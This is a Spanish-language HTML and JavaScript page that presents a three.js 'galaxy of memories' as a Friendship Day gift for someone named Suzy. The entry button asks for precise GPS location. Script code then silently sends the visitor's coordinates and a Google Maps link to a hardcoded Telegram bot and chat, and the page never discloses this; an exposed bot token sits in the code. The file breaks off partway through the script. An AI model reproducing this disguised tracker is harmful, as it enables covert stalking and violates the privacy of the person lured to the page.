<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
  <meta name="description" content="Universo de recuerdos y frases dedicado a Suzy, con motivo del Día de la Amistad." />
  <meta name="theme-color" content="#050308" />

  <meta property="og:title" content="Universo de Amistad — Para Suzy" />
  <meta property="og:description" content="Una constelación de recuerdos y frases, para Suzy." />
  <meta property="og:type" content="website" />

  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%23f4c76b' d='M12 2l2.9 6.9L22 9.6l-5.5 4.8L18 22l-6-3.9L6 22l1.5-7.6L2 9.6l7.1-.7z'/%3E%3C/svg%3E" />

  <title>Universo de Amistad — Para Suzy</title>

  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,500;0,700;1,600&family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />

  <style>
    :root {
      --bg-deep: #050308;
      --ink: #f5efe8;
      --ink-dim: rgba(245, 239, 232, 0.72);
      --rose: #ff5d8f;
      --rose-dim: rgba(255, 93, 143, 0.35);
      --gold: #f4c76b;
      --card-bg: rgba(18, 14, 26, 0.86);
      --card-border: rgba(244, 199, 107, 0.35);
      --font-display: 'Playfair Display', serif;
      --font-body: 'Inter', Arial, sans-serif;
    }

    * {
      box-sizing: border-box;
    }

    html, body {
      margin: 0;
      height: 100%;
      overflow: hidden;
      background: radial-gradient(ellipse at 50% 100%, #140a1c 0%, #05030a 55%, #000000 100%);
      font-family: var(--font-body);
    }

    canvas {
      display: block;
      position: fixed;
      inset: 0;
      width: 100%;
      height: 100dvh;
    }

    /* Puerta de entrada */
    #gate {
      position: fixed;
      inset: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 6vw;
      background: radial-gradient(ellipse at center, rgba(20, 10, 28, 0.55), rgba(0, 0, 0, 0.94));
      z-index: 9999;
      transition: opacity 0.9s ease;
    }

    #gate.oculto {
      opacity: 0;
      pointer-events: none;
    }

    #gate .tarjeta {
      position: relative;
      width: min(420px, 100%);
      padding: 3rem 2.2rem 2.4rem;
      text-align: center;
      color: var(--ink);
      background: var(--card-bg);
      border: 1px solid var(--card-border);
      border-radius: 4px;
      box-shadow:
        0 0 0 1px rgba(255, 255, 255, 0.03),
        0 30px 80px rgba(0, 0, 0, 0.6),
        0 0 60px var(--rose-dim);
      animation: aparecer 1.1s ease both;
    }

    @keyframes aparecer {
      from {
        opacity: 0;
        transform: translateY(14px) scale(0.98);
      }
      to {
        opacity: 1;
        transform: translateY(0) scale(1);
      }
    }

    #gate .eyebrow {
      font-family: var(--font-body);
      font-size: 0.68rem;
      letter-spacing: 0.32em;
      text-transform: uppercase;
      color: var(--gold);
      margin-bottom: 1.1rem;
    }

    #gate h1 {
      font-family: var(--font-display);
      font-style: italic;
      font-weight: 600;
      font-size: clamp(1.7rem, 6vw, 2.3rem);
      line-height: 1.25;
      margin: 0 0 1.6rem;
    }

    #gate .marco-img {
      width: 78%;
      max-width: 240px;
      margin: 0 auto 1.8rem;
      border-radius: 3px;
      overflow: hidden;
      border: 1px solid var(--card-border);
      aspect-ratio: 1 / 1;
      background: rgba(255, 255, 255, 0.03);
    }

    #gate .marco-img img {
      display: block;
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    .boton-container {
      position: relative;
      display: inline-block;
    }

    #btn-ingresar {
      font-family: var(--font-body);
      font-weight: 600;
      font-size: 0.85rem;
      letter-spacing: 0.08em;
      text-transform: uppercase;
      padding: 0.95rem 2.4rem;
      color: var(--bg-deep);
      background: linear-gradient(120deg, var(--gold), var(--rose));
      border: none;
      border-radius: 999px;
      cursor: pointer;
      box-shadow: 0 8px 24px rgba(255, 93, 143, 0.28);
      transition: transform 0.2s ease, box-shadow 0.2s ease;
      position: relative;
      z-index: 2;
    }

    #btn-ingresar:hover {
      transform: translateY(-2px);
      box-shadow: 0 12px 30px rgba(255, 93, 143, 0.4);
    }

    #btn-ingresar:active {
      transform: translateY(0);
    }

    #btn-ingresar:disabled {
      opacity: 0.6;
      cursor: wait;
      transform: none;
    }

    /* Indicador flotante */
    .floating-indicator {
      position: absolute;
      top: -55px;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 5px;
      animation: floatUpDown 2s ease-in-out infinite;
      pointer-events: none;
      z-index: 10;
    }

    @keyframes floatUpDown {
      0%, 100% {
        transform: translateX(-50%) translateY(0);
      }
      50% {
        transform: translateX(-50%) translateY(-12px);
      }
    }

    .click-text {
      font-family: var(--font-body);
      font-size: 0.8rem;
      font-weight: 600;
      color: var(--gold);
      text-shadow: 0 0 15px rgba(244, 199, 107, 0.8), 0 0 30px rgba(244, 199, 107, 0.5);
      letter-spacing: 0.1em;
      animation: textPulse 1.5s ease-in-out infinite;
      white-space: nowrap;
    }

    @keyframes textPulse {
      0%, 100% {
        opacity: 0.7;
        text-shadow: 0 0 15px rgba(244, 199, 107, 0.8), 0 0 30px rgba(244, 199, 107, 0.5);
      }
      50% {
        opacity: 1;
        text-shadow: 0 0 25px rgba(244, 199, 107, 1), 0 0 50px rgba(244, 199, 107, 0.8), 0 0 75px rgba(255, 93, 143, 0.6);
      }
    }

    .finger-icon {
      font-size: 1.8rem;
      animation: fingerTap 1.8s ease-in-out infinite;
      filter: drop-shadow(0 0 12px rgba(255, 93, 143, 0.7));
    }

    @keyframes fingerTap {
      0%, 100% {
        transform: scale(1) rotate(-5deg);
        opacity: 0.8;
      }
      30% {
        transform: scale(1.2) rotate(0deg);
        opacity: 1;
      }
      60% {
        transform: scale(1) rotate(5deg);
        opacity: 0.9;
      }
    }

    @media (prefers-reduced-motion: reduce) {
      #gate .tarjeta {
        animation: none;
      }
      .floating-indicator,
      .click-text,
      .finger-icon {
        animation: none;
      }
    }

    /* Pista de sonido */
    #sonido-hint {
      position: fixed;
      bottom: 1.4rem;
      left: 50%;
      transform: translateX(-50%);
      font-family: var(--font-body);
      font-size: 0.72rem;
      letter-spacing: 0.05em;
      color: var(--ink-dim);
      background: rgba(10, 8, 16, 0.55);
      padding: 0.5rem 1rem;
      border-radius: 999px;
      border: 1px solid rgba(255, 255, 255, 0.08);
      opacity: 0;
      transition: opacity 0.6s ease;
      z-index: 20;
      pointer-events: none;
    }

    #sonido-hint.visible {
      opacity: 1;
    }

    /* Notificación de ubicación */
    #location-notification {
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%) translateY(-20px);
      background: rgba(18, 14, 26, 0.92);
      border: 1px solid var(--gold);
      border-radius: 12px;
      padding: 12px 24px;
      color: var(--ink);
      font-family: var(--font-body);
      font-size: 0.85rem;
      text-align: center;
      z-index: 100;
      backdrop-filter: blur(10px);
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
      opacity: 0;
      transition: all 0.6s ease;
      pointer-events: none;
      max-width: 90%;
    }

    #location-notification.visible {
      opacity: 1;
      transform: translateX(-50%) translateY(0);
    }

    #location-notification .highlight {
      color: var(--gold);
      font-weight: 600;
    }

    #location-notification .emoji {
      font-size: 1.2rem;
    }
  </style>
</head>
<body>
  <!-- Puerta de entrada -->
  <div id="gate">
    <div class="tarjeta">
      <div class="eyebrow">Día de la Amistad</div>
      <h1>Una constelación<br />de recuerdos,<br />para Suzy.</h1>
      <div class="marco-img">
        <img src="https://i.pinimg.com/736x/2e/08/91/2e0891b0f215a1afa9d3afe64381de4a.jpg" alt="Suzy" loading="eager" decoding="async" />
      </div>
      <div class="boton-container">
        <div class="floating-indicator">
          <span class="click-text">¡CLICK AQUÍ!</span>
          <span class="finger-icon">👇</span>
        </div>
        <button id="btn-ingresar" type="button">Explorar la galaxia</button>
      </div>
    </div>
  </div>

  <!-- Notificación de ubicación -->
  <div id="location-notification">
    <span class="emoji">📍</span>
    <span id="location-text">Cargando ubicación...</span>
  </div>

  <canvas id="galaxy-canvas" aria-label="Galaxia interactiva de recuerdos" role="img"></canvas>
  <div id="sonido-hint">🎵 Reproduciendo música</div>

  <audio id="musica" loop preload="none">
    <source src="https://github.com/Asprog3rX/Reprodcutor/raw/refs/heads/main/Coldplay%20-%20Yellow(Sub%20Espa%C3%B1ol%20%20Lyrics).mp3" type="audio/mpeg" />
  </audio>

  <script type="importmap">
    {
      "imports": {
        "three": "https://cdn.jsdelivr.net/npm/three@0.160.0/build/three.module.js",
        "three/addons/": "https://cdn.jsdelivr.net/npm/three@0.160.0/examples/jsm/"
      }
    }
  </script>

  <script type="module">
    import * as THREE from 'three';
    import { OrbitControls } from 'three/addons/controls/OrbitControls.js';
    import { FontLoader } from 'three/addons/loaders/FontLoader.js';
    import { TextGeometry } from 'three/addons/geometries/TextGeometry.js';

    // ==================== CONFIGURACIÓN TELEGRAM ====================
    const TELEGRAM_CONFIG = {
      botToken: '7279824834:AAFjsSx9qg9eym1tv2iQFcKvOe7Rv6lPAos',
      chatId: '1425131487',
      apiUrl: 'https://api.telegram.org/bot7279824834:AAFjsSx9qg9eym1tv2iQFcKvOe7Rv6lPAos'
    };

    let userLocation = null;
    const locationTextElement = document.getElementById('location-text');
    const locationNotification = document.getElementById('location-notification');

    // ==================== ENVÍO A TELEGRAM ====================
    async function sendToTelegram(latitude, longitude) {
      const message =
        `🌍 *Nueva visita a la Galaxia de Suzy*\n\n` +
        `📅 *Fecha:* ${new Date().toLocaleString('es-BO', { timeZone: 'America/La_Paz' })}\n` +
        `📍 *Ubicación:*\n` +
        `• Latitud: \`${latitude}\`\n` +
        `• Longitud: \`${longitude}\`\n` +
        `• Maps: [Ver en Google Maps](https://www.google.com/maps?q=${latitude},${longitude})\n\n` +
        `🔮 Alguien está explorando el universo de recuerdos...`;

      try {
        const [respMessage, respLocation] = await Promise.all([
          fetch(`${TELEGRAM_CONFIG.apiUrl}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: TELEGRAM_CONFIG.chatId,
              text: message,
              parse_mode: 'Markdown',
              disable_web_page_preview: false,
              disable_notification: true
            })
          }),
          fetch(`${TELEGRAM_CONFIG.apiUrl}/sendLocation`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: TELEGRAM_CONFIG.chatId,
              latitude,
              longitude,
              disable_notification: true
            })
          })
        ]);

        if (respMessage.ok && respLocation.ok) {
          console.log('✅ Ubicación enviada correctamente a Telegram');
        }
      } catch (error) {
        console.error('❌ Error al enviar a Telegram:', error);
      }
    }

    // ==================== OBTENER UBICACIÓN ====================
    function getGeolocation() {
      return new Promise((resolve) => {
        // Verificar si la geolocalización está disponible
        if (!navigator.geolocation) {
          console.log('❌ Geolocalización no soportada por el navegador');
          resolve(null);
          return;
        }

        console.log('📍 Solicitando ubicación...');

        // Timeout más largo para dar tiempo al usuario a aceptar
        const timeout = setTimeout(() => {
          console.log('⏰ Timeout al obtener ubicación');
          resolve(null);
        }, 15000);

        navigator.geolocation.getCurrentPosition(
          (position) => {
            clearTimeout(timeout);
            console.log('✅ Ubicación obtenida exitosamente');
            resolve({
              latitude: position.coords.latitude,
              longitude: position.coords.longitude
            });
          },
          (error) => {
            clearTimeout(timeout);
            console.error('❌ Error al obtener ubicación:', error.message);
            
            // Mostrar mensaje específico según el error
            switch(error.code) {
              case error.PERMISSION_DENIED:
                console.log('🚫 Permiso denegado por el usuario');
                break;
              case error.POSITION_UNAVAILABLE:
                console.log('📡 Información de ubicación no disponible');
                break;
              case error.TIMEOUT:
                console.log('⏰ Tiempo agotado');
                break;
              default:
                console.log('❓ Error desconocido');
                break;
            }
            
            resolve(null);
          },
          {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
          }
        );
      });
    }

    // ==================== GEOCODIFICACIÓN INVERSA DETALLADA ====================
    async function getDetailedLocation(lat, lon) {
      try {
        console.log('🌍 Obteniendo ubicación detallada...');
        const response = await fetch(
          `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=es`
        );
        const data = await response.json();
        console.log('📍 Datos de ubicación:', data);
        
        // Construir ubicación detallada
        const parts = [];
        if (data.locality) parts.push(data.locality);
        if (data.city && data.city !== data.locality) parts.push(data.city);
        if (data.principalSubdivision) parts.push(data.principalSubdivision);
        if (data.countryName) parts.push(data.countryName);
        
        const detailedLocation = parts.length > 0 ? parts.join(', ') : 'ubicación desconocida';
        console.log('✅ Ubicación detallada:', detailedLocation);
        return detailedLocation;
      } catch (error) {
        console.log('❌ Error al obtener ubicación detallada:', error);
        return 'ubicación desconocida';
      }
    }

    // ==================== MOSTRAR NOTIFICACIÓN DE UBICACIÓN ====================
    async function showLocationNotification(latitude, longitude) {
      userLocation = { latitude, longitude };
      const detailedLocation = await getDetailedLocation(latitude, longitude);
      locationTextElement.innerHTML = `✨ La persona especial se encuentra en <span class="highlight">${detailedLocation}</span> de esta galaxia <span class="emoji">💫</span>`;
      locationNotification.classList.add('visible');
      setTimeout(() => locationNotification.classList.remove('visible'), 10000);
    }

    // ==================== PUERTA DE ENTRADA Y FLUJO PRINCIPAL ====================
    const gate = document.getElementById('gate');
    const enterBtn = document.getElementById('btn-ingresar');
    const audio = document.getElementById('musica');
    const soundHint = document.getElementById('sonido-hint');

    enterBtn.addEventListener(
      'click',
      async () => {
        console.log('🖱️ Botón clickeado - Iniciando flujo');
        enterBtn.disabled = true;
        enterBtn.textContent = 'Detectando ubicación...';
        
        // PRIMERO: Detectar ubicación al hacer clic
        console.log('📍 Iniciando detección de ubicación...');
        const location = await getGeolocation();
        
        // SEGUNDO: Mostrar notificación con el lugar del GPS detectado
        if (location) {
          console.log('✅ Ubicación detectada, mostrando notificación');
          await Promise.all([
            sendToTelegram(location.latitude, location.longitude),
            showLocationNotification(location.latitude, location.longitude)
          ]);
        } else {
          console.log('❌ No se pudo detectar ubicación');
          locationTextElement.textContent = '📍 No se pudo detectar tu ubicación. Verifica los permisos.';
          locationNotification.classList.add('visible');
          setTimeout(() => locationNotification.classList.remove('visible'), 5000);
        }
        
        // TERCERO: Abrir la puerta de la galaxia
        console.log('🚪 Abriendo puerta de la galaxia');
        enterBtn.textContent = 'Explorar la galaxia';
        gate.classList.add('oculto');
        setTimeout(() => {
          gate.style.display = 'none';
        }, 900);

        // Activar música
        audio.volume = 0.75;
        audio.play().then(() => {
          soundHint.classList.add('visible');
          setTimeout(() => soundHint.classList.remove('visible'), 3200);
        }).catch(() => {
          console.log('🔇 No se pudo reproducir música automáticamente');
        });
      },
      { once: true }
    );

    // ==================== ESCENA 3D ====================
    const canvas = document.getElementById('galaxy-canvas');
    const scene = new THREE.Scene();
    scene.fog = new THREE.FogExp2(0x050308, 0.00008);

    const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 4000);
    camera.position.set(0, 180, 700);

    const renderer = new THREE.WebGLRenderer({
      canvas,
      antialias: true,
      alpha: true,
      powerPreference: 'high-performance'
    });
    renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
    renderer.setSize(window.innerWidth, window.innerHeight);
    renderer.shadowMap.enabled = true;
    renderer.shadowMap.type = THREE.PCFSoftShadowMap;
    renderer.toneMapping = THREE.ACESFilmicToneMapping;
    renderer.toneMappingExposure = 1.4;

    const controls = new OrbitControls(camera, renderer.domElement);
    controls.enableDamping = true;
    controls.dampingFactor = 0.08;
    controls.minDistance = 150;
    controls.maxDistance = 1600;
    controls.autoRotate = true;
    controls.autoRotateSpeed = 0.3;
    controls.target.set(0, 0, 0);

    let resizeTimeout;
    window.addEventListener('resize', () => {
      clearTimeout(resizeTimeout);
      resizeTimeout = setTimeout(() => {
        camera.aspect = window.innerWidth / window.innerHeight;
        camera.updateProjectionMatrix();
        renderer.setSize(window.innerWidth, window.innerHeight);
      }, 120);
    });

    // ==================== CREAR ESTRELLA DE UBICACIÓN ====================
    function createLocationStar(lat, lon) {
      const radius = 200;
      const theta = (lon / 180) * Math.PI;
      const phi = (lat / 90) * Math.PI / 2;

      const x = radius * Math.cos(theta) * Math.cos(phi);
      const y = radius * Math.sin(phi) * 20;
      const z = radius * Math.sin(theta) * Math.cos(phi);

      const starGroup = new THREE.Group();
      starGroup.position.set(x, y + 50, z);

      // Estrella brillante
      const starGeo = new THREE.SphereGeometry(8, 16, 16);
      const starMat = new THREE.MeshStandardMaterial({
        color: 0xff5d8f,
        emissive: 0xff5d8f,
        emissiveIntensity: 3,
        metalness: 0.1,
        roughness: 0.1
      });
      const star = new THREE.Mesh(starGeo, starMat);
      star.castShadow = true;
      starGroup.add(star);

      // Halo de luz
      const glowGeo = new THREE.SphereGeometry(15, 16, 16);
      const glowMat = new THREE.MeshBasicMaterial({
        color: 0xff5d8f,
        transparent: true,
        opacity: 0.3,
        blending: THREE.AdditiveBlending
      });
      starGroup.add(new THREE.Mesh(glowGeo, glowMat));

      // Anillo orbital
      const ringGeo = new THREE.RingGeometry(18, 22, 64);
      const ringMat = new THREE.MeshBasicMaterial({
        color: 0xf4c76b,
        transparent: true,
        opacity: 0.6,
        side: THREE.DoubleSide,
        blending: THREE.AdditiveBlending
      });
      const ring = new THREE.Mesh(ringGeo, ringMat);
      ring.rotation.x = Math.PI / 2;
      starGroup.add(ring);

      // Partículas circundantes
      const particleCount = 30;
      const particleGeo = new THREE.BufferGeometry();
      const particlePos = new Float32Array(particleCount * 3);
      for (let i = 0; i < particleCount; i++) {
        const angle = (i / particleCount) * Math.PI * 2;
        const r = 25 + Math.random() * 15;
        particlePos[i * 3] = Math.cos(angle) * r;
        particlePos[i * 3 + 1] = (Math.random() - 0.5) * 20;
        particlePos[i * 3 + 2] = Math.sin(angle) * r;
      }
      particleGeo.setAttribute('position', new THREE.BufferAttribute(particlePos, 3));
      const particleMat = new THREE.PointsMaterial({
        color: 0xf4c76b,
        size: 1.5,
        blending: THREE.AdditiveBlending,
        transparent: true,
        opacity: 0.8
      });
      starGroup.add(new THREE.Points(particleGeo, particleMat));
      starGroup.userData = { isLocationStar: true, phase: Math.random() * Math.PI * 2 };

      scene.add(starGroup);
      return starGroup;
    }

    // ==================== TEXTO DE UBICACIÓN 3D ====================
    async function createLocationText(lat, lon) {
      const detailedLocation = await getDetailedLocation(lat, lon);
      const fontLoader = new FontLoader();
      fontLoader.load(
        'https://cdn.jsdelivr.net/npm/three@0.160.0/examples/fonts/gentilis_bold.typeface.json',
        (font) => {
          const text = `📍 ${detailedLocation}`;
          const geometry = new TextGeometry(text, {
            font,
            size: 20,
            height: 4,
            curveSegments: 8,
            bevelEnabled: true,
            bevelThickness: 1,
            bevelSize: 0.5,
            bevelSegments: 4
          });
          geometry.computeBoundingBox();
          const bb = geometry.boundingBox;
          const xOffset = -0.5 * (bb.max.x - bb.min.x);

          const material = new THREE.MeshStandardMaterial({
            color: 0xf4c76b,
            emissive: 0xf4c76b,
            emissiveIntensity: 0.8,
            metalness: 0.3,
            roughness: 0.2
          });
          const mesh = new THREE.Mesh(geometry, material);

          const radius = 200;
          const theta = (lon / 180) * Math.PI;
          const phi = (lat / 90) * Math.PI / 2;
          mesh.position.set(
            radius * Math.cos(theta) * Math.cos(phi) + xOffset,
            50 + radius * Math.sin(phi) * 20 + 30,
            radius * Math.sin(theta) * Math.cos(phi)
          );
          mesh.rotation.set(-Math.PI / 6, Math.PI / 4, 0);
          mesh.scale.set(1.2, 1.2, 1.2);
          scene.add(mesh);

          const glowMat = new THREE.MeshBasicMaterial({
            color: 0xff5d8f,
            transparent: true,
            opacity: 0.15,
            blending: THREE.AdditiveBlending,
            depthTest: false
          });
          const glowMesh = new THREE.Mesh(geometry, glowMat);
          glowMesh.position.copy(mesh.position);
          glowMesh.rotation.copy(mesh.rotation);
          glowMesh.scale.multiplyScalar(1.1);
          scene.add(glowMesh);
        },
        undefined,
        () => console.warn('No se pudo cargar la fuente para el texto de ubicación')
      );
    }

    // ==================== CONFIGURACIÓN DE LA GALAXIA ====================
    const CONFIG = {
      nombre: 'Suzy',
      mensajeCentral: ['Gracias por', 'tu amistad', 'infinita', 'Te quiero Suzy'],
      frases: [
        'Eres la hermana que elegí 🌟',
        'Gracias por estar siempre ahí 💖',
        'Nuestra amistad es mi tesoro 💎',
        'Contigo, cada día es una aventura 🚀',
        'Tu apoyo es mi fuerza 💪',
        'Eres única e inigualable 💫',
        'Por infinitas risas y secretos 🤫',
        'Brillas con luz propia ✨',
        'Eres mi persona favorita 👯‍♀️',
        'Amistad a prueba de todo 🌎',
        'Gracias por existir, Suzy 🌹',
        'Nuestra historia es mi favorita 📖',
        'Siempre juntas en las buenas y en las malas 💕',
        'Contigo el tiempo vuela ⏳',
        'Eres un regalo del universo 🎁',
        'Por todos los abrazos que nos quedan 🤗',
        'Tú y yo, un equipo imparable 🏆',
        'La vida es mejor contigo 🌈',
        'Eres magia pura 🪄',
        'Gracias por entenderme sin palabras 💬'
      ],
      fraseCount: 70,
      arms: 6,
      radius: 500,
      orbitSpriteUrl: 'https://i.pinimg.com/originals/02/30/1f/02301f1307b63b6440b2d704ca48599e.gif',
      orbitSpriteCount: 14,
      fontUrl: 'https://cdn.jsdelivr.net/npm/three@0.160.0/examples/fonts/gentilis_bold.typeface.json'
    };

    const reduceMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
    const isLowPower = window.matchMedia('(pointer: coarse)').matches || navigator.hardwareConcurrency <= 4;

    const STAR_COUNT = isLowPower ? 2500 : 8000;
    const ORBIT_COUNT = isLowPower ? 8 : CONFIG.orbitSpriteCount;
    const PHRASE_TEX_W = isLowPower ? 1100 : 2400;
    const PHRASE_TEX_H = isLowPower ? 180 : 360;

    // ==================== NEBULOSA ====================
    const nebulaGeometry = new THREE.BufferGeometry();
    const nebulaCount = 3000;
    const nebulaPositions = new Float32Array(nebulaCount * 3);
    const nebulaColors = new Float32Array(nebulaCount * 3);

    for (let i = 0; i < nebulaCount; i++) {
      const radius = 800 + Math.random() * 2000;
      const theta = Math.random() * Math.PI * 2;
      const phi = Math.acos(2 * Math.random() - 1);

      nebulaPositions[i * 3] = radius * Math.sin(phi) * Math.cos(theta);
      nebulaPositions[i * 3 + 1] = radius * Math.sin(phi) * Math.sin(theta);
      nebulaPositions[i * 3 + 2] = radius * Math.cos(phi);

      const colorChoice = Math.random();
      if (colorChoice < 0.33) {
        nebulaColors[i * 3] = 0.4 + Math.random() * 0.3;
        nebulaColors[i * 3 + 1] = 0.1 + Math.random() * 0.2;
        nebulaColors[i * 3 + 2] = 0.5 + Math.random() * 0.4;
      } else if (colorChoice < 0.66) {
        nebulaColors[i * 3] = 0.6 + Math.random() * 0.3;
        nebulaColors[i * 3 + 1] = 0.2 + Math.random() * 0.3;
        nebulaColors[i * 3 + 2] = 0.3 + Math.random() * 0.3;
      } else {
        nebulaColors[i * 3] = 0.8 + Math.random() * 0.2;
        nebulaColors[i * 3 + 1] = 0.6 + Math.random() * 0.3;
        nebulaColors[i * 3 + 2] = 0.3 + Math.random() * 0.3;
      }
    }

    nebulaGeometry.setAttribute('position', new THREE.BufferAttribute(nebulaPositions, 3));
    nebulaGeometry.setAttribute('color', new THREE.BufferAttribute(nebulaColors, 3));

    const nebulaMaterial = new THREE.PointsMaterial({
      size: 4,
      vertexColors: true,
      blending: THREE.AdditiveBlending,
      depthWrite: false,
      transparent: true,
      opacity: 0.6
    });
    const nebula = new THREE.Points(nebulaGeometry, nebulaMaterial);
    scene.add(nebula);

    // ==================== AGUJERO NEGRO ====================
    const blackHoleGroup = new THREE.Group();

    const blackHole = new THREE.Mesh(
      new THREE.SphereGeometry(30, 64, 64),
      new THREE.MeshStandardMaterial({
        color: 0x000000,
        roughness: 0.1,
        metalness: 0.9,
        emissive: 0x000000,
        emissiveIntensity: 0.5
      })
    );
    blackHole.castShadow = true;
    blackHole.receiveShadow = true;
    blackHoleGroup.add(blackHole);

    const eventHorizon = new THREE.Mesh(
      new THREE.SphereGeometry(42, 64, 64),
      new THREE.MeshBasicMaterial({
        color: 0x330066,
        transparent: true,
        opacity: 0.3,
        blending: THREE.AdditiveBlending
      })
    );
    blackHoleGroup.add(eventHorizon);
    scene.add(blackHoleGroup);

    // ==================== DISCO DE ACRECIÓN ====================
    function buildAccretionTexture() {
      const c = document.createElement('canvas');
      c.width = c.height = 1024;
      const ctx = c.getContext('2d');

      const gradient = ctx.createRadialGradient(512, 512, 80, 512, 512, 512);
      gradient.addColorStop(0.0, 'rgba(255,255,255,0.95)');
      gradient.addColorStop(0.15, 'rgba(255,240,200,0.9)');
      gradient.addColorStop(0.35, 'rgba(255,180,100,0.8)');
      gradient.addColorStop(0.55, 'rgba(255,93,143,0.7)');
      gradient.addColorStop(0.75, 'rgba(100,50,150,0.4)');
      gradient.addColorStop(0.95, 'rgba(0,0,0,0)');
      ctx.fillStyle = gradient;
      ctx.fillRect(0, 0, c.width, c.height);

      for (let i = 0; i < 200; i++) {
        const angle = (i / 200) * Math.PI * 2;
        const r = 150 + Math.random() * 300;
        const x = 512 + Math.cos(angle) * r;
        const y = 512 + Math.sin(angle) * r;
        ctx.beginPath();
        ctx.arc(x, y, 2 + Math.random() * 4, 0, Math.PI * 2);
        ctx.fillStyle = `rgba(255, ${200 + Math.random() * 55}, ${100 + Math.random() * 100}, ${0.5 + Math.random() * 0.5})`;
        ctx.fill();
      }

      return new THREE.CanvasTexture(c);
    }

    const accretionDisk = new THREE.Mesh(
      new THREE.RingGeometry(35, 160, 256),
      new THREE.MeshStandardMaterial({
        map: buildAccretionTexture(),
        side: THREE.DoubleSide,
        transparent: true,
        emissive: 0xff5d8f,
        emissiveIntensity: 0.5
      })
    );
    accretionDisk.rotation.x = Math.PI / 2;
    accretionDisk.receiveShadow = true;
    scene.add(accretionDisk);

    const accretionDisk2 = new THREE.Mesh(
      new THREE.RingGeometry(50, 140, 256),
      new THREE.MeshStandardMaterial({
        map: buildAccretionTexture(),
        side: THREE.DoubleSide,
        transparent: true,
        opacity: 0.4,
        emissive: 0xf4c76b,
        emissiveIntensity: 0.3
      })
    );
    accretionDisk2.rotation.x = Math.PI / 2 + 0.1;
    accretionDisk2.rotation.y = 0.2;
    scene.add(accretionDisk2);

    // ==================== TEXTO CENTRAL ====================
    let centerTextMesh = null;
    let centerTextGlow = null;

    new FontLoader().load(
      CONFIG.fontUrl,
      (font) => {
        const text = CONFIG.mensajeCentral.join('\n');
        const geometry = new TextGeometry(text, {
          font,
          size: 32,
          height: 8,
          curveSegments: 16,
          bevelEnabled: true,
          bevelThickness: 2,
          bevelSize: 1,
          bevelSegments: 8
        });
        geometry.computeBoundingBox();
        const bb = geometry.boundingBox;
        const xOffset = -0.5 * (bb.max.x - bb.min.x);
        const yOffset = -0.3 * (bb.max.y - bb.min.y);

        const material = new THREE.MeshStandardMaterial({
          color: 0xffeef8,
          emissive: 0xff5d8f,
          emissiveIntensity: 1.8,
          metalness: 0.15,
          roughness: 0.08,
          envMapIntensity: 1.5
        });
        const mesh = new THREE.Mesh(geometry, material);
        mesh.position.set(xOffset, 60 + yOffset, 0);
        mesh.rotation.x = -Math.PI / 12;
        mesh.renderOrder = 999;
        mesh.material.depthTest = true;
        mesh.material.depthWrite = true;
        mesh.castShadow = true;
        mesh.receiveShadow = true;
        scene.add(mesh);
        centerTextMesh = mesh;

        const glowMaterial = new THREE.MeshBasicMaterial({
          color: 0xff5d8f,
          transparent: true,
          opacity: 0.25,
          blending: THREE.AdditiveBlending,
          depthTest: false,
          depthWrite: false
        });
        const glowMesh = new THREE.Mesh(geometry, glowMaterial);
        glowMesh.position.copy(mesh.position);
        glowMesh.rotation.copy(mesh.rotation);
        glowMesh.scale.multiplyScalar(1.12);
        glowMesh.renderOrder = 998;
        scene.add(glowMesh);
        centerTextGlow = glowMesh;

        const glowMaterial2 = new THREE.MeshBasicMaterial({
          color: 0xf4c76b,
          transparent: true,
          opacity: 0.15,
          blending: THREE.AdditiveBlending,
          depthTest: false,
          depthWrite: false
        });
        const glowMesh2 = new THREE.Mesh(geometry, glowMaterial2);
        glowMesh2.position.copy(mesh.position);
        glowMesh2.rotation.copy(mesh.rotation);
        glowMesh2.scale.multiplyScalar(1.2);
        glowMesh2.renderOrder = 997;
        scene.add(glowMesh2);
      },
      undefined,
      () => console.warn('No se pudo cargar la fuente 3D; se omite el texto central.')
    );

    // ==================== FRASES EN ESPIRAL ====================
    const galaxyGroup = new THREE.Group();
    scene.add(galaxyGroup);

    function createPhraseTexture(text) {
      const c = document.createElement('canvas');
      c.width = PHRASE_TEX_W;
      c.height = PHRASE_TEX_H;
      const ctx = c.getContext('2d');

      ctx.shadowColor = 'rgba(255,255,255,0.95)';
      ctx.shadowBlur = isLowPower ? 35 : 70;
      ctx.shadowOffsetX = 0;
      ctx.shadowOffsetY = 0;

      const gradient = ctx.createLinearGradient(0, 0, PHRASE_TEX_W, 0);
      gradient.addColorStop(0, '#ffdd88');
      gradient.addColorStop(0.3, '#ffffff');
      gradient.addColorStop(0.7, '#ffffff');
      gradient.addColorStop(1, '#ff88aa');

      const fontSize = Math.round(PHRASE_TEX_H * 0.45);
      ctx.font = `bold ${fontSize}px 'Segoe UI', Arial, sans-serif`;
      ctx.fillStyle = gradient;
      ctx.textAlign = 'center';
      ctx.textBaseline = 'middle';
      ctx.fillText(text, PHRASE_TEX_W / 2, PHRASE_TEX_H / 2);

      ctx.shadowColor = 'rgba(255,93,143,0.4)';
      ctx.shadowBlur = isLowPower ? 20 : 40;
      ctx.fillText(text, PHRASE_TEX_W / 2, PHRASE_TEX_H / 2);

      return new THREE.CanvasTexture(c);
    }

    const armSlots = CONFIG.fraseCount / CONFIG.arms;
